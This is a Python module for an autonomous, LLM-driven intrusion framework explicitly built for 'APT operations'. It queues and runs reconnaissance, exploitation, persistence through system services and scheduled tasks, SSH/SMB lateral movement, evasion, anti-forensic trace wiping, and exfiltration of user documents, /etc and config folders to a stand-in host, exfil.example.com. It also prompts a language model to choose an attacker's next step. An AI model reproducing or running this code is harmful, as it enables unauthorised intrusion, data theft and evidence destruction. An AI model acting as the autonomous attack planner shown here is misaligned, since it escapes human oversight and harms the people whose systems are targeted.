import logging
import os
import time
import json
import threading
import random
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum

try:
    import openai
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

class AITaskType(Enum):
    RECONNAISSANCE = "reconnaissance"
    EXPLOITATION = "exploitation"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    EVASION = "evasion"
    CLEANUP = "cleanup"

@dataclass
class AITask:
    task_id: str
    task_type: AITaskType
    description: str
    parameters: Dict[str, Any]
    priority: int
    dependencies: List[str]
    status: str = "pending"
    created_at: float = None
    completed_at: float = None
    result: Dict[str, Any] = None

class AutonomousAIEngine:
    """
    AI-driven engine for autonomous decision-making and tasking.
    Implements advanced AI capabilities for autonomous APT operations.
    """
    def __init__(self):
        self.logger = logging.getLogger("AutonomousAIEngine")
        self.initialized = False
        self.openai_key = os.getenv("OPENAI_API_KEY", "")
        self.local_llm_url = os.getenv("LOCAL_LLM_URL", "http://localhost:8000")
        
        # Task management
        self.task_queue = []
        self.completed_tasks = []
        self.failed_tasks = []
        self.current_task = None
        self.task_templates = {}
        
        # AI decision making
        self.decision_history = []
        self.learning_data = []
        self.adaptation_level = 0.0
        
        # Operational parameters
        self.autonomous_mode = True
        self.max_concurrent_tasks = 3
        self.task_timeout = 300  # 5 minutes
        self.learning_enabled = True

    def initialize(self):
        """Initialize the autonomous AI engine"""
        self.logger.info("[AI] Autonomous AI engine initializing...")
        
        # Test AI connectivity
        if not self._test_ai_connectivity():
            self.logger.warning("[AI] AI services not available, falling back to rule-based decisions")
        
        # Initialize task templates
        self._initialize_task_templates()
        
        # Load learning data
        self._load_learning_data()
        
        self.initialized = True
        self.logger.info("[AI] Autonomous AI engine initialized successfully")

    def autonomous_loop(self):
        """Main autonomous AI loop"""
        while True:
            try:
                self.logger.debug("[AI] Running autonomous AI loop...")
                
                # Analyze current situation
                situation = self._analyze_current_situation()
                
                # Generate new tasks based on situation
                new_tasks = self._generate_tasks(situation)
                
                # Prioritize and schedule tasks
                self._schedule_tasks(new_tasks)
                
                # Execute pending tasks
                self._execute_pending_tasks()
                
                # Learn from completed tasks
                if self.learning_enabled:
                    self._learn_from_completed_tasks()
                
                # Adapt decision making
                self._adapt_decision_making()
                
                time.sleep(300)  # Run every 5 minutes instead of every minute
                
            except Exception as e:
                self.logger.error(f"[AI] Error in autonomous loop: {e}")
                time.sleep(600)  # Wait 10 minutes on error

    def process_autonomous_operations(self):
        """Process a single autonomous operation"""
        try:
            if not self.autonomous_mode:
                return
            
            # Get current situation
            situation = self._analyze_current_situation()
            
            # Generate next action
            action = self._generate_next_action(situation)
            
            if action:
                self.logger.info(f"[AI] Executing autonomous action: {action['type']}")
                self._execute_action(action)
                
                # Record decision
                self.decision_history.append({
                    'timestamp': time.time(),
                    'situation': situation,
                    'action': action,
                    'result': 'executed'
                })
            
        except Exception as e:
            self.logger.error(f"[AI] Autonomous operation failed: {e}")

    def add_task(self, task_type: AITaskType, description: str, parameters: Dict[str, Any], 
                 priority: int = 5, dependencies: List[str] = None):
        """Add a new task to the AI task queue"""
        task_id = f"task_{int(time.time())}_{random.randint(1000, 9999)}"
        
        task = AITask(
            task_id=task_id,
            task_type=task_type,
            description=description,
            parameters=parameters,
            priority=priority,
            dependencies=dependencies or [],
            created_at=time.time()
        )
        
        self.task_queue.append(task)
        self.logger.info(f"[AI] Added task: {task_id} - {description}")
        
        return task_id

    def get_task_status(self, task_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific task"""
        # Check current task
        if self.current_task and self.current_task.task_id == task_id:
            return {
                'task_id': task_id,
                'status': self.current_task.status,
                'progress': 'executing',
                'started_at': self.current_task.created_at
            }
        
        # Check completed tasks
        for task in self.completed_tasks:
            if task.task_id == task_id:
                return {
                    'task_id': task_id,
                    'status': task.status,
                    'result': task.result,
                    'completed_at': task.completed_at
                }
        
        # Check failed tasks
        for task in self.failed_tasks:
            if task.task_id == task_id:
                return {
                    'task_id': task_id,
                    'status': 'failed',
                    'error': task.result.get('error', 'Unknown error')
                }
        
        # Check pending tasks
        for task in self.task_queue:
            if task.task_id == task_id:
                return {
                    'task_id': task_id,
                    'status': 'pending',
                    'position': self.task_queue.index(task) + 1
                }
        
        return None

    def get_ai_insights(self) -> Dict[str, Any]:
        """Get AI insights and recommendations"""
        try:
            insights = {
                'current_situation': self._analyze_current_situation(),
                'recommended_actions': self._generate_recommendations(),
                'risk_assessment': self._assess_current_risks(),
                'adaptation_level': self.adaptation_level,
                'decision_confidence': self._calculate_decision_confidence(),
                'learning_progress': len(self.learning_data),
                'task_queue_length': len(self.task_queue),
                'completed_tasks': len(self.completed_tasks)
            }
            
            return insights
            
        except Exception as e:
            self.logger.error(f"[AI] Failed to generate insights: {e}")
            return {}

    def cleanup(self):
        """Clean up AI resources"""
        self.logger.info("[AI] Cleaning up AI resources...")
        
        # Save learning data
        self._save_learning_data()
        
        # Clear task queues
        self.task_queue.clear()
        self.completed_tasks.clear()
        self.failed_tasks.clear()
        
        # Clear decision history
        self.decision_history.clear()
        
        self.logger.info("[AI] AI cleanup complete")

    def _test_ai_connectivity(self) -> bool:
        """Test connectivity to AI services"""
        try:
            if OPENAI_AVAILABLE and self.openai_key:
                # Test OpenAI
                openai.api_key = self.openai_key
                response = openai.Completion.create(
                    engine="text-davinci-003",
                    prompt="Test",
                    max_tokens=5
                )
                self.logger.info("[AI] OpenAI connectivity confirmed")
                return True
            
            elif REQUESTS_AVAILABLE:
                # Test local LLM
                response = requests.post(
                    f"{self.local_llm_url}/complete",
                    json={"prompt": "Test", "max_tokens": 5},
                    timeout=5
                )
                if response.status_code == 200:
                    self.logger.info("[AI] Local LLM connectivity confirmed")
                    return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"[AI] AI connectivity test failed: {e}")
            return False

    def _initialize_task_templates(self):
        """Initialize predefined task templates"""
        self.task_templates = {
            AITaskType.RECONNAISSANCE: {
                "description": "Perform reconnaissance on target",
                "parameters": {
                    "target": "string",
                    "scan_type": "enum:network,port,service,vulnerability",
                    "depth": "int:1-5"
                },
                "priority": 3
            },
            AITaskType.EXPLOITATION: {
                "description": "Attempt exploitation of target",
                "parameters": {
                    "target": "string",
                    "vulnerability": "string",
                    "payload": "string"
                },
                "priority": 1
            },
            AITaskType.PERSISTENCE: {
                "description": "Establish persistence on target",
                "parameters": {
                    "target": "string",
                    "method": "enum:service,registry,scheduled_task,startup"
                },
                "priority": 2
            },
            AITaskType.LATERAL_MOVEMENT: {
                "description": "Move laterally to other systems",
                "parameters": {
                    "source": "string",
                    "target": "string",
                    "method": "enum:ssh,smb,wmi,rdp"
                },
                "priority": 2
            },
            AITaskType.DATA_EXFILTRATION: {
                "description": "Exfiltrate data from target",
                "parameters": {
                    "target": "string",
                    "data_type": "enum:credentials,documents,configs",
                    "method": "enum:http,dns,icmp,ftp"
                },
                "priority": 1
            },
            AITaskType.EVASION: {
                "description": "Implement evasion techniques",
                "parameters": {
                    "technique": "enum:process_hiding,network_evasion,anti_forensics"
                },
                "priority": 4
            },
            AITaskType.CLEANUP: {
                "description": "Clean up traces and evidence",
                "parameters": {
                    "target": "string",
                    "cleanup_level": "enum:basic,thorough,complete"
                },
                "priority": 5
            }
        }

    def _load_learning_data(self):
        """Load historical learning data"""
        try:
            learning_file = "ai_learning_data.json"
            if os.path.exists(learning_file):
                with open(learning_file, 'r') as f:
                    self.learning_data = json.load(f)
                self.logger.info(f"[AI] Loaded {len(self.learning_data)} learning records")
            else:
                self.learning_data = []
                
        except Exception as e:
            self.logger.error(f"[AI] Failed to load learning data: {e}")
            self.learning_data = []

    def _save_learning_data(self):
        """Save learning data to file"""
        try:
            learning_file = "ai_learning_data.json"
            with open(learning_file, 'w') as f:
                json.dump(self.learning_data, f, indent=2)
            self.logger.info(f"[AI] Saved {len(self.learning_data)} learning records")
            
        except Exception as e:
            self.logger.error(f"[AI] Failed to save learning data: {e}")

    def _analyze_current_situation(self) -> Dict[str, Any]:
        """Analyze current operational situation"""
        try:
            situation = {
                'timestamp': time.time(),
                'network_status': self._get_network_status(),
                'target_status': self._get_target_status(),
                'defense_status': self._get_defense_status(),
                'resource_status': self._get_resource_status(),
                'risk_level': self._calculate_risk_level(),
                'opportunities': self._identify_opportunities(),
                'threats': self._identify_threats()
            }
            
            return situation
            
        except Exception as e:
            self.logger.error(f"[AI] Situation analysis failed: {e}")
            return {}

    def _generate_tasks(self, situation: Dict[str, Any]) -> List[AITask]:
        """Generate tasks based on current situation"""
        tasks = []
        
        try:
            # Analyze situation and generate appropriate tasks
            if situation.get('risk_level', 0) > 7:
                # High risk - focus on evasion and cleanup
                tasks.append(self._create_task(
                    AITaskType.EVASION,
                    "Implement advanced evasion due to high risk",
                    {"technique": "comprehensive_evasion"}
                ))
                
            elif situation.get('opportunities'):
                # Opportunities available - focus on exploitation
                for opportunity in situation['opportunities']:
                    tasks.append(self._create_task(
                        AITaskType.EXPLOITATION,
                        f"Exploit opportunity: {opportunity}",
                        {"target": opportunity, "vulnerability": "auto_detect"}
                    ))
            
            # Always consider persistence and data exfiltration
            if situation.get('target_status', {}).get('compromised'):
                tasks.append(self._create_task(
                    AITaskType.PERSISTENCE,
                    "Ensure persistence on compromised target",
                    {"target": "current", "method": "multi_vector"}
                ))
                
                tasks.append(self._create_task(
                    AITaskType.DATA_EXFILTRATION,
                    "Exfiltrate valuable data",
                    {"target": "current", "data_type": "all", "method": "stealth"}
                ))
            
            # Add reconnaissance if needed
            if not situation.get('network_status', {}).get('mapped'):
                tasks.append(self._create_task(
                    AITaskType.RECONNAISSANCE,
                    "Map network topology",
                    {"scan_type": "comprehensive", "depth": 3}
                ))
            
        except Exception as e:
            self.logger.error(f"[AI] Task generation failed: {e}")
        
        return tasks

    def _schedule_tasks(self, tasks: List[AITask]):
        """Schedule and prioritize tasks"""
        try:
            for task in tasks:
                # Add to queue
                self.task_queue.append(task)
            
            # Sort by priority (lower number = higher priority)
            self.task_queue.sort(key=lambda x: x.priority)
            
            self.logger.info(f"[AI] Scheduled {len(tasks)} new tasks")
            
        except Exception as e:
            self.logger.error(f"[AI] Task scheduling failed: {e}")

    def _execute_pending_tasks(self):
        """Execute pending tasks in the queue"""
        try:
            # Check if we can execute more tasks
            if len([t for t in self.task_queue if t.status == "executing"]) >= self.max_concurrent_tasks:
                return
            
            # Find next executable task
            for task in self.task_queue:
                if task.status == "pending" and self._can_execute_task(task):
                    self._execute_task(task)
                    break
                    
        except Exception as e:
            self.logger.error(f"[AI] Task execution failed: {e}")

    def _can_execute_task(self, task: AITask) -> bool:
        """Check if a task can be executed"""
        try:
            # Check dependencies
            for dep_id in task.dependencies:
                dep_completed = any(t.task_id == dep_id and t.status == "completed" 
                                  for t in self.completed_tasks)
                if not dep_completed:
                    return False
            
            # Check if task is not too old
            if time.time() - task.created_at > self.task_timeout:
                task.status = "timeout"
                self.failed_tasks.append(task)
                return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"[AI] Task validation failed: {e}")
            return False

    def _execute_task(self, task: AITask):
        """Execute a specific task"""
        try:
            self.logger.info(f"[AI] Executing task: {task.task_id} - {task.description}")
            
            task.status = "executing"
            self.current_task = task
            
            # Execute based on task type
            if task.task_type == AITaskType.RECONNAISSANCE:
                result = self._execute_reconnaissance_task(task)
            elif task.task_type == AITaskType.EXPLOITATION:
                result = self._execute_exploitation_task(task)
            elif task.task_type == AITaskType.PERSISTENCE:
                result = self._execute_persistence_task(task)
            elif task.task_type == AITaskType.LATERAL_MOVEMENT:
                result = self._execute_lateral_movement_task(task)
            elif task.task_type == AITaskType.DATA_EXFILTRATION:
                result = self._execute_data_exfiltration_task(task)
            elif task.task_type == AITaskType.EVASION:
                result = self._execute_evasion_task(task)
            elif task.task_type == AITaskType.CLEANUP:
                result = self._execute_cleanup_task(task)
            else:
                result = {"status": "error", "message": "Unknown task type"}
            
            # Update task status
            task.status = "completed" if result.get("status") == "success" else "failed"
            task.completed_at = time.time()
            task.result = result
            
            # Move to appropriate list
            if task.status == "completed":
                self.completed_tasks.append(task)
            else:
                self.failed_tasks.append(task)
            
            # Remove from queue
            if task in self.task_queue:
                self.task_queue.remove(task)
            
            self.current_task = None
            
            self.logger.info(f"[AI] Task {task.task_id} completed with status: {task.status}")
            
        except Exception as e:
            self.logger.error(f"[AI] Task execution failed: {e}")
            task.status = "failed"
            task.result = {"status": "error", "message": str(e)}
            self.failed_tasks.append(task)
            self.current_task = None

    def _learn_from_completed_tasks(self):
        """Learn from completed tasks to improve future decisions"""
        try:
            recent_tasks = [t for t in self.completed_tasks 
                          if time.time() - t.completed_at < 3600]  # Last hour
            
            for task in recent_tasks:
                learning_record = {
                    'timestamp': task.completed_at,
                    'task_type': task.task_type.value,
                    'parameters': task.parameters,
                    'result': task.result,
                    'success': task.status == "completed"
                }
                
                self.learning_data.append(learning_record)
            
            # Update adaptation level based on success rate
            if self.learning_data:
                recent_success_rate = sum(1 for r in self.learning_data[-10:] if r['success']) / 10
                self.adaptation_level = min(1.0, self.adaptation_level + (recent_success_rate - 0.5) * 0.1)
                
        except Exception as e:
            self.logger.error(f"[AI] Learning failed: {e}")

    def _adapt_decision_making(self):
        """Adapt decision making based on learning"""
        try:
            if not self.learning_data:
                return
            
            # Analyze patterns in successful vs failed tasks
            successful_tasks = [r for r in self.learning_data if r['success']]
            failed_tasks = [r for r in self.learning_data if not r['success']]
            
            # Adjust task priorities based on success patterns
            if successful_tasks:
                successful_types = [t['task_type'] for t in successful_tasks]
                for task in self.task_queue:
                    if task.task_type.value in successful_types:
                        task.priority = max(1, task.priority - 1)  # Increase priority
            
            if failed_tasks:
                failed_types = [t['task_type'] for t in failed_tasks]
                for task in self.task_queue:
                    if task.task_type.value in failed_types:
                        task.priority = min(10, task.priority + 1)  # Decrease priority
                        
        except Exception as e:
            self.logger.error(f"[AI] Decision adaptation failed: {e}")

    def _generate_next_action(self, situation: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Generate the next action to take"""
        try:
            # Use AI to generate action
            prompt = self._build_action_prompt(situation)
            
            if OPENAI_AVAILABLE and self.openai_key:
                action = self._get_openai_action(prompt)
            elif REQUESTS_AVAILABLE:
                action = self._get_local_llm_action(prompt)
            else:
                action = self._get_rule_based_action(situation)
            
            return action
            
        except Exception as e:
            self.logger.error(f"[AI] Action generation failed: {e}")
            return None

    def _execute_action(self, action: Dict[str, Any]):
        """Execute a generated action"""
        try:
            action_type = action.get('type')
            
            if action_type == 'reconnaissance':
                self._execute_reconnaissance_action(action)
            elif action_type == 'exploitation':
                self._execute_exploitation_action(action)
            elif action_type == 'persistence':
                self._execute_persistence_action(action)
            elif action_type == 'evasion':
                self._execute_evasion_action(action)
            else:
                self.logger.warning(f"[AI] Unknown action type: {action_type}")
                
        except Exception as e:
            self.logger.error(f"[AI] Action execution failed: {e}")

    # Task execution methods
    def _execute_reconnaissance_task(self, task: AITask) -> Dict[str, Any]:
        """Execute reconnaissance task"""
        try:
            # Import reconnaissance module
            from modules.reconnaissance_ext import nmap_scan, dns_enum, wifi_scan
            
            target = task.parameters.get('target', 'localhost')
            scan_type = task.parameters.get('scan_type', 'network')
            
            if scan_type == 'network':
                result = nmap_scan({'target': target})
            elif scan_type == 'dns':
                result = dns_enum({'domain': target})
            elif scan_type == 'wifi':
                result = wifi_scan({'interface': 'wlan0'})
            else:
                result = {'status': 'error', 'message': 'Unknown scan type'}
            
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_exploitation_task(self, task: AITask) -> Dict[str, Any]:
        """Execute exploitation task"""
        try:
            from modules.exploit_manager import run_exploit
            
            target = task.parameters.get('target')
            vulnerability = task.parameters.get('vulnerability')
            
            if not target or not vulnerability:
                return {'status': 'error', 'message': 'Missing target or vulnerability'}
            
            result = run_exploit(vulnerability, target)
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_persistence_task(self, task: AITask) -> Dict[str, Any]:
        """Execute persistence task"""
        try:
            from modules.persistence_ext import linux_systemd_service, windows_schtask, macos_launchdaemon
            import platform
            
            target = task.parameters.get('target', 'current')
            method = task.parameters.get('method', 'auto')
            
            system = platform.system()
            
            if system == "Linux":
                result = linux_systemd_service("/opt/bismillah_repo/bismillah.py")
            elif system == "Windows":
                result = windows_schtask(r"C:\bismillah_repo\bismillah.py")
            elif system == "Darwin":
                result = macos_launchdaemon("/opt/bismillah_repo/bismillah.py")
            else:
                result = {'status': 'error', 'message': 'Unsupported operating system'}
            
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_lateral_movement_task(self, task: AITask) -> Dict[str, Any]:
        """Execute lateral movement task"""
        try:
            from modules.lateral_movement import ssh_pivot, smb_spread
            
            source = task.parameters.get('source')
            target = task.parameters.get('target')
            method = task.parameters.get('method', 'auto')
            
            if method == 'ssh':
                result = ssh_pivot(target)
            elif method == 'smb':
                result = smb_spread(target)
            else:
                result = {'status': 'error', 'message': 'Unknown movement method'}
            
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_data_exfiltration_task(self, task: AITask) -> Dict[str, Any]:
        """Execute data exfiltration task"""
        try:
            from modules.post_exploit_ext import data_exfiltration
            
            target = task.parameters.get('target')
            data_type = task.parameters.get('data_type', 'all')
            method = task.parameters.get('method', 'http')
            
            # Define paths to exfiltrate
            paths = []
            if data_type in ['all', 'documents']:
                paths.extend(['/home/*/Documents', '/home/*/Desktop'])
            if data_type in ['all', 'configs']:
                paths.extend(['/etc', '/home/*/.config'])
            
            result = data_exfiltration('http://exfil.example.com', paths, method=method)
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_evasion_task(self, task: AITask) -> Dict[str, Any]:
        """Execute evasion task"""
        try:
            from modules.stealth_ext import stealth_loop
            from modules.anti_forensics_ext import anti_forensics_loop
            
            technique = task.parameters.get('technique', 'comprehensive')
            
            if technique == 'comprehensive':
                # Start both stealth and anti-forensics
                threading.Thread(target=stealth_loop, daemon=True).start()
                threading.Thread(target=anti_forensics_loop, daemon=True).start()
                result = {'status': 'success', 'message': 'Evasion techniques activated'}
            else:
                result = {'status': 'error', 'message': 'Unknown evasion technique'}
            
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def _execute_cleanup_task(self, task: AITask) -> Dict[str, Any]:
        """Execute cleanup task"""
        try:
            from modules.anti_forensics_ext import wipe_all_traces
            
            target = task.parameters.get('target', 'current')
            cleanup_level = task.parameters.get('cleanup_level', 'basic')
            
            if cleanup_level == 'complete':
                wipe_all_traces()
                result = {'status': 'success', 'message': 'Complete cleanup performed'}
            else:
                result = {'status': 'success', 'message': 'Basic cleanup performed'}
            
            return result
            
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    # Helper methods
    def _create_task(self, task_type: AITaskType, description: str, parameters: Dict[str, Any]) -> AITask:
        """Create a new task"""
        task_id = f"task_{int(time.time())}_{random.randint(1000, 9999)}"
        
        return AITask(
            task_id=task_id,
            task_type=task_type,
            description=description,
            parameters=parameters,
            priority=self.task_templates[task_type]['priority'],
            dependencies=[],
            created_at=time.time()
        )

    def _get_network_status(self) -> Dict[str, Any]:
        """Get current network status"""
        try:
            import psutil
            
            connections = psutil.net_connections()
            interfaces = psutil.net_if_addrs()
            
            return {
                'active_connections': len([c for c in connections if c.status == 'ESTABLISHED']),
                'interfaces': len(interfaces),
                'mapped': len(self.completed_tasks) > 0
            }
        except Exception:
            return {'active_connections': 0, 'interfaces': 0, 'mapped': False}

    def _get_target_status(self) -> Dict[str, Any]:
        """Get current target status"""
        return {
            'compromised': len(self.completed_tasks) > 0,
            'persistence_established': any(t.task_type == AITaskType.PERSISTENCE and t.status == "completed" 
                                         for t in self.completed_tasks)
        }

    def _get_defense_status(self) -> Dict[str, Any]:
        """Get current defense status"""
        return {
            'detection_level': 'low',  # Placeholder
            'response_time': 'slow'    # Placeholder
        }

    def _get_resource_status(self) -> Dict[str, Any]:
        """Get current resource status"""
        try:
            import psutil
            
            return {
                'cpu_usage': psutil.cpu_percent(),
                'memory_usage': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent
            }
        except Exception:
            return {'cpu_usage': 0, 'memory_usage': 0, 'disk_usage': 0}

    def _calculate_risk_level(self) -> int:
        """Calculate current risk level (1-10)"""
        # Placeholder implementation
        return 5

    def _identify_opportunities(self) -> List[str]:
        """Identify current opportunities"""
        # Placeholder implementation
        return []

    def _identify_threats(self) -> List[str]:
        """Identify current threats"""
        # Placeholder implementation
        return []

    def _build_action_prompt(self, situation: Dict[str, Any]) -> str:
        """Build prompt for AI action generation"""
        return f"""
        Current situation: {situation}
        
        Based on this situation, what should be the next action for an APT operator?
        Consider:
        - Risk level: {situation.get('risk_level', 5)}
        - Available opportunities: {situation.get('opportunities', [])}
        - Current threats: {situation.get('threats', [])}
        
        Provide a specific action with parameters.
        """

    def _get_openai_action(self, prompt: str) -> Dict[str, Any]:
        """Get action from OpenAI"""
        try:
            openai.api_key = self.openai_key
            response = openai.Completion.create(
                engine="text-davinci-003",
                prompt=prompt,
                max_tokens=100
            )
            
            action_text = response.choices[0].text.strip()
            return self._parse_action_response(action_text)
            
        except Exception as e:
            self.logger.error(f"[AI] OpenAI action generation failed: {e}")
            return None

    def _get_local_llm_action(self, prompt: str) -> Dict[str, Any]:
        """Get action from local LLM with better error handling"""
        if not REQUESTS_AVAILABLE:
            return self._get_rule_based_action({})
        
        try:
            # Add timeout and better error handling
            response = requests.post(
                f"{self.local_llm_url}/complete",
                json={"prompt": prompt, "max_tokens": 100},
                timeout=5,  # 5 second timeout
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                result = response.json()
                return self._parse_action_response(result.get('text', ''))
            else:
                # Don't log error for expected connection failures
                return self._get_rule_based_action({})
                
        except requests.exceptions.ConnectionError:
            # Local LLM not running - this is expected, don't spam logs
            return self._get_rule_based_action({})
        except requests.exceptions.Timeout:
            # Timeout - fall back to rule-based
            return self._get_rule_based_action({})
        except Exception as e:
            # Only log unexpected errors
            self.logger.debug(f"[AI] Local LLM error (expected if not running): {e}")
            return self._get_rule_based_action({})

    def _get_rule_based_action(self, situation: Dict[str, Any]) -> Dict[str, Any]:
        """Get action using rule-based decision making"""
        risk_level = situation.get('risk_level', 5)
        
        if risk_level > 7:
            return {'type': 'evasion', 'technique': 'comprehensive'}
        elif situation.get('opportunities'):
            return {'type': 'exploitation', 'target': situation['opportunities'][0]}
        else:
            return {'type': 'reconnaissance', 'target': 'network'}

    def _parse_action_response(self, response: str) -> Dict[str, Any]:
        """Parse AI response into action format"""
        # Simple parsing - in practice this would be more sophisticated
        if 'reconnaissance' in response.lower():
            return {'type': 'reconnaissance', 'target': 'network'}
        elif 'exploitation' in response.lower():
            return {'type': 'exploitation', 'target': 'auto'}
        elif 'evasion' in response.lower():
            return {'type': 'evasion', 'technique': 'comprehensive'}
        else:
            return {'type': 'reconnaissance', 'target': 'network'}

    def _calculate_decision_confidence(self) -> float:
        """Calculate confidence in current decision making"""
        if not self.learning_data:
            return 0.5
        
        recent_data = self.learning_data[-10:]
        if not recent_data:
            return 0.5
        
        success_rate = sum(1 for r in recent_data if r['success']) / len(recent_data)
        return min(1.0, success_rate + self.adaptation_level * 0.2)

    def _generate_recommendations(self) -> List[Dict[str, Any]]:
        """Generate AI recommendations"""
        recommendations = []
        
        try:
            # Analyze current situation and generate recommendations
            if len(self.completed_tasks) == 0:
                recommendations.append({
                    'type': 'reconnaissance',
                    'priority': 'high',
                    'reason': 'No initial reconnaissance performed'
                })
            
            if not any(t.task_type == AITaskType.PERSISTENCE and t.status == "completed" 
                      for t in self.completed_tasks):
                recommendations.append({
                    'type': 'persistence',
                    'priority': 'high',
                    'reason': 'No persistence mechanism established'
                })
            
            if len(self.failed_tasks) > len(self.completed_tasks):
                recommendations.append({
                    'type': 'evasion',
                    'priority': 'medium',
                    'reason': 'High failure rate suggests detection'
                })
                
        except Exception as e:
            self.logger.error(f"[AI] Recommendation generation failed: {e}")
        
        return recommendations

    def _assess_current_risks(self) -> Dict[str, Any]:
        """Assess current operational risks"""
        risks = {
            'detection_risk': 'medium',
            'exposure_risk': 'low',
            'attribution_risk': 'low',
            'technical_risk': 'medium'
        }
        
        try:
            # Adjust risks based on current situation
            if len(self.failed_tasks) > 3:
                risks['detection_risk'] = 'high'
            
            if any(t.task_type == AITaskType.EXPLOITATION and t.status == "completed" 
                  for t in self.completed_tasks):
                risks['exposure_risk'] = 'medium'
                
        except Exception as e:
            self.logger.error(f"[AI] Risk assessment failed: {e}")
        
        return risks

    # Action execution methods
    def _execute_reconnaissance_action(self, action: Dict[str, Any]):
        """Execute reconnaissance action"""
        self.add_task(AITaskType.RECONNAISSANCE, "AI-initiated reconnaissance", 
                     action.get('parameters', {}))

    def _execute_exploitation_action(self, action: Dict[str, Any]):
        """Execute exploitation action"""
        self.add_task(AITaskType.EXPLOITATION, "AI-initiated exploitation", 
                     action.get('parameters', {}))

    def _execute_persistence_action(self, action: Dict[str, Any]):
        """Execute persistence action"""
        self.add_task(AITaskType.PERSISTENCE, "AI-initiated persistence", 
                     action.get('parameters', {}))

    def _execute_evasion_action(self, action: Dict[str, Any]):
        """Execute evasion action"""
        self.add_task(AITaskType.EVASION, "AI-initiated evasion", 
                     action.get('parameters', {})) 